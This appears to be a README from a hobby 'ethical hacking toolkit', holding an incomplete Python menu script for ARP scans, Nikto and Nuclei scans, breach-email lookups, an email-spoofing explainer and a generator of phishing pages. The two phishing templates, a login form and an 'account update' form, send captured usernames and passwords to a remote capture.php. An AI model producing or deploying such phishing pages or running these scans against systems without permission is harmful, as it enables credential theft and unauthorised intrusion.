# Ultimate-Ethical-Hacking-Toolkit
اداه لفعل كل شيء
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████╗  █████╗ ██████╗ ██╗  ██╗     ██╗ ██████╗ ██╗  ██╗███████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔════╝
██║  ██║███████║██████╔╝█████╔╝█████╗██║██║   ██║█████╔╝ █████╗  ███████╗
██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██║██║   ██║██╔═██╗ ██╔══╝  ╚════██║
███████║██║  ██║██║  ██║██║  ██╗     ██║╚██████╔╝██║  ██╗███████╗███████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
           Ultimate Ethical Hacking Toolkit - Educational Only (v10.0)
"""

import os
import sys
import socket
import random
import time
import subprocess
from datetime import datetime
import platform
import hashlib
import requests
import json
import dns.resolver
import nmap
import whois
import builtwith
import paramiko
import ftplib
import smtplib
import ssl
import csv
import mechanize
from bs4 import BeautifulSoup
import geoip2.database
from mac_vendor_lookup import MacLookup
import dns.reversename
import argparse
import sqlite3
import xml.etree.ElementTree as ET
import zipfile
import io
from threading import Thread
from scapy.all import ARP, Ether, srp

# ... [Previous configurations remain the same] ...

class NetworkScanner:
    def __init__(self):
        self.arp = ARP()
        self.ether = Ether()
    
    def arp_scan(self, network):
        """Network discovery using ARP (Educational)"""
        print_warning("WARNING: ARP scanning should only be done on networks you own or have permission to scan")
        
        try:
            print_status(f"Scanning network {network}...")
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            devices = []
            for element in answered:
                device = {'ip': element[1].psrc, 'mac': element[1].hwsrc}
                try:
                    device['vendor'] = MacLookup().lookup(device['mac'])
                except:
                    device['vendor'] = "Unknown"
                devices.append(device)
            
            print_success("Discovered devices:")
            for device in devices:
                print(f"IP: {device['ip']} | MAC: {device['mac']} | Vendor: {device['vendor']}")
            
            return devices
        except Exception as e:
            print_error(f"ARP scan failed: {str(e)}")
            return None

class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target
    
    def nikto_scan(self):
        """Run Nikto web vulnerability scanner (Educational)"""
        print_status("Running Nikto web vulnerability scan...")
        result = run_command(f"nikto -h {self.target}")
        return result
    
    def nuclei_scan(self):
        """Run Nuclei vulnerability scanner (Educational)"""
        print_status("Running Nuclei scan...")
        result = run_command(f"nuclei -u {self.target}")
        return result
    
    def check_pwned_emails(self, email_list):
        """Check if emails appear in breaches (Educational)"""
        print_warning("WARNING: This checks against HaveIBeenPwned API")
        
        results = {}
        for email in email_list:
            try:
                url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
                headers = {"hibp-api-key": "YOUR_API_KEY"}  # Register for free API key
                response = requests.get(url, headers=headers)
                
                if response.status_code == 200:
                    results[email] = json.loads(response.text)
                elif response.status_code == 404:
                    results[email] = "No breaches found"
                else:
                    results[email] = f"Error: {response.status_code}"
            except Exception as e:
                results[email] = f"API error: {str(e)}"
        
        return results

class SocialEngineeringTools:
    @staticmethod
    def generate_phishing_page(template="login"):
        """Generate phishing page template (Educational/Defensive)"""
        print_warning("WARNING: Phishing is illegal without explicit permission")
        print_warning("This is for educational/defensive purposes only")
        
        templates = {
            "login": """
            <html>
            <body>
            <h1>Please Login</h1>
            <form action="http://legit-site.com/capture.php" method="POST">
                Username: <input type="text" name="user"><br>
                Password: <input type="password" name="pass"><br>
                <input type="submit" value="Login">
            </form>
            </body>
            </html>
            """,
            "update": """
            <html>
            <body>
            <h1>Account Update Required</h1>
            <form action="http://legit-site.com/capture.php" method="POST">
                Email: <input type="text" name="email"><br>
                Current Password: <input type="password" name="current_pass"><br>
                New Password: <input type="password" name="new_pass"><br>
                <input type="submit" value="Update">
            </form>
            </body>
            </html>
            """
        }
        
        if template in templates:
            filename = f"{template}_phish.html"
            with open(filename, "w") as f:
                f.write(templates[template])
            print_success(f"Generated template saved as {filename}")
            return filename
        else:
            print_error("Invalid template selected")
            return None

    @staticmethod
    def email_spoofer_test():
        """Demonstrate email spoofing concepts (Educational)"""
        print_warning("WARNING: Email spoofing is illegal without permission")
        print("This is a simulation for educational purposes only")
        
        print("\nEmail spoofing works by altering email headers:")
        print("From: CEO <ceo@company.com>")
        print("Reply-To: attacker@evil.com")
        print("Subject: Urgent: Wire Transfer Needed")
        print("\nDefenses:")
        print("- Enable SPF, DKIM, DMARC records")
        print("- Train employees to spot phishing")
        print("- Use email filtering solutions")

# ... [Update main menu and add new menus] ...

def main_menu():
    target = None
    recon = None
    pentest = None
    advanced = None
    vuln_scanner = None
    net_scanner = None
    se_tools = None
    
    while True:
        print_banner()
        print(f"{Color.BOLD}Main Menu:{Color.END}")
        print(f"{Color.GREEN}[1]{Color.END} Set Target")
        print(f"{Color.GREEN}[2]{Color.END} Basic Reconnaissance")
        print(f"{Color.GREEN}[3]{Color.END} Pentesting Tools")
        print(f"{Color.GREEN}[4]{Color.END} Advanced Recon")
        print(f"{Color.GREEN}[5]{Color.END} Vulnerability Scanning")
        print(f"{Color.GREEN}[6]{Color.END} Network Scanning")
        print(f"{Color.GREEN}[7]{Color.END} Social Engineering Tools")
        print(f"{Color.GREEN}[8]{Color.END} Mobile Tools (Termux)")
        print(f"{Color.GREEN}[9]{Color.END} Generate Report")
        print(f"{Color.GREEN}[0]{Color.END} Exit")
        
        choice = input(f"\n{Color.YELLOW}[?] Select option: {Color.END}")
        
        if choice == '1':
            target = input(f"{Color.CYAN}[?] Enter target (domain/IP/network): {Color.END}")
            sys.last_target = target
            recon = ReconEngine(target)
            pentest = PentestEngine(target)
            advanced = AdvancedRecon(target)
            vuln_scanner = VulnerabilityScanner(target)
            net_scanner = NetworkScanner()
            se_tools = SocialEngineeringTools()
        elif choice == '2' and target:
            recon_menu(recon)
        elif choice == '3' and target:
            pentest_menu(pentest)
        elif choice == '4' and target:
            advanced_recon_menu(advanced)
        elif choice == '5' and target:
            vulnerability_menu(vuln_scanner)
        elif choice == '6':
            network_scan_menu(net_scanner)
        elif choice == '7':
            social_engineering_menu(se_tools)
        elif choice == '8' and IS_TERMUX:
            mobile_menu()
        elif choice == '9' and target:
            generate_report(target)
        elif choice == '0':
            print(f"{Color.RED}Exiting...{Color.END}")
            sys.exit()
        else:
            print_warning("Invalid option or target not set")
        
        input(f"\n{Color.CYAN}[Press Enter to continue...]{Color.END}")

def vulnerability_menu(scanner):
    while True:
        print_banner()
        print(f"{Color.BOLD}Vulnerability Scanning:{Color.END}")
        print(f"{Color.GREEN}[1]{Color.END} Nikto Web Scan")
        print(f"{Color.GREEN}[2]{Color.END} Nuclei Scan")
        print(f"{Color.GREEN}[3]{Color.END} Check Pwned Emails")
        print(f"{Color.GREEN}[0]{Color.END} Back to Main Menu")
        
        choice = input(f"\n{Color.YELLOW}[?] Select option: {Color.END}")
        
        if choice == '1':
            result = scanner.nikto_scan()
            print(result)
        elif choice == '2':
            result = scanner.nuclei_scan()
            print(result)
        elif choice == '3':
            emails = input(f"{Color.CYAN}[?] Enter emails (comma separated): {Color.END}").split(',')
            results = scanner.check_pwned_emails([e.strip() for e in emails])
            print(json.dumps(results, indent=2))
        elif choice == '0':
            break
        else:
            print_warning("Invalid option")
        
        input(f"\n{Color.CYAN}[Press Enter to continue...]{Color.END}")

def network_scan_menu(scanner):
    while True:
        print_banner()
        print(f"{Color.BOLD}Network Scanning:{Color.END}")
        print(f"{Color.GREEN}[1]{Color.END} ARP Scan")
        print(f"{Color.GREEN}[2]{Color.END} Ping Sweep")
        print(f"{Color.GREEN}[0]{Color.END} Back to Main Menu")
        
        choice = input(f"\n{Color.YELLOW}[?] Select option: {Color.END}")
        
        if choice == '1':
            network = input(f"{Color.CYAN}[?] Enter network (e.g., 192.168.1.0/24): {Color.END}")
            scanner.arp_scan(network)
        elif choice == '2':
            print("Ping sweep functionality would be here")
        elif choice == '0':
            break
        else:
            print_warning("Invalid option")
        
        input(f"\n{Color.CYAN}[Press Enter to continue...]{Color.END}")

def social_engineering_menu(tools):
    while True:
        print_banner()
        print(f"{Color.BOLD}Social Engineering Tools (Educational Only):{Color.END}")
        print(f"{Color.GREEN}[1]{Color.END} Generate Phishing Page Template")
        print(f"{Color.GREEN}[2]{Color.END} Email Spoofing Demonstration")
        print(f"{Color.GREEN}[0]{Color.END} Back to Main Menu")
        
        choice = input(f"\n{Color.YELLOW}[?] Select option: {Color.END}")
        
        if choice == '1':
            template = input(f"{Color.CYAN}[?] Enter template (login/update): {Color.END}") or "login"
            tools.generate_phishing_page(template)
        elif choice == '2':
            tools.email_spoofer_test()
        elif choice == '0':
            break
        else:
            print_warning("Invalid option")
        
        input(f"\n{Color.CYAN}[Press Enter to continue...]{Color.END}")

# ... [Rest of the code remains the same] ...

if __name__ == "__main__":
    # Enhanced legal disclaimer
    print(f"{Color.RED}{Color.BOLD}")
    print("╔══════════════════════════════════════════════════╗")
    print("║               DISCLAIMER AND WARNING             ║")
    print("╠══════════════════════════════════════════════════╣")
    print("║ This tool is for educational purposes only.      ║")
    print("║ Unauthorized scanning, testing, or hacking of    ║")
    print("║ systems you don't own or have permission to test ║")
    print("║ is ILLEGAL. The developers assume no liability   ║")
    print("║ and are not responsible for any misuse or damage.║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"{Color.END}")
    
    # Get explicit consent
    consent = input(f"{Color.YELLOW}Do you agree to use this tool only for legal, authorized, and educational purposes? (y/n): {Color.END}")
    if consent.lower() != 'y':
        print(f"{Color.RED}Exiting...{Color.END}")
        sys.exit()
    
    if len(sys.argv) > 1:
        cli_mode()
    else:
        main_menu()
